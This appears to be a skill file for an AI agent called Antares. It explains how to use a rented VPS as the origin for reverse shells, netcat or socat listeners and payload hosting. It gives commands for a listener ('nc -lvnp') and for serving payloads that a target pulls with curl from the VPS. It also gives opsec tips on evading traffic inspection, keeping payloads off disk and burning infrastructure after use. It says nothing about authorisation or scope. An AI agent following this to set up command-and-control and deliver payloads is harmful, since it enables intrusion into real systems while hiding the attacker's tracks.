---
name: vps-reverse-shell
description: Use a VPS as the stable, attributable-safe origin for reverse shells, listeners and payload hosting.
tags: [security, vps, reverse-shell, infrastructure]
triggers: [vps, reverse shell, listener, payload host, c2]
---

# VPS reverse shell

Your own machine should never be the origin of an engagement's traffic. A VPS
gives a stable public IP, a clean listener, and a place to host payloads.

## Provision

1. Bring up a cheap VPS (Vultr, DigitalOcean, Hetzner, or one you already own).
   Register it with `vps_run` so Antares can drive it.
2. Harden minimally: key-only SSH, a non-default port, no root login.
3. Open only the ports you need for this engagement.

## Listen

- `vps_run`: `nc -lvnp <port>` or a socat listener on the VPS.
- The target connects out to `<vps-ip>:<port>`. Outbound is almost always
  allowed where inbound is not.

## Host payloads

- Serve files with `python3 -m http.server` on the VPS; the target pulls with
  `curl <vps-ip>:8000/payload`.
- Keep payloads off disk once pulled, and rotate the directory between targets.

## Opsec

- One VPS per engagement where possible; burn it after.
- Front the listener with a domain and TLS if the target inspects traffic.
- Log everything on the VPS and pull the logs into the ledger before teardown.
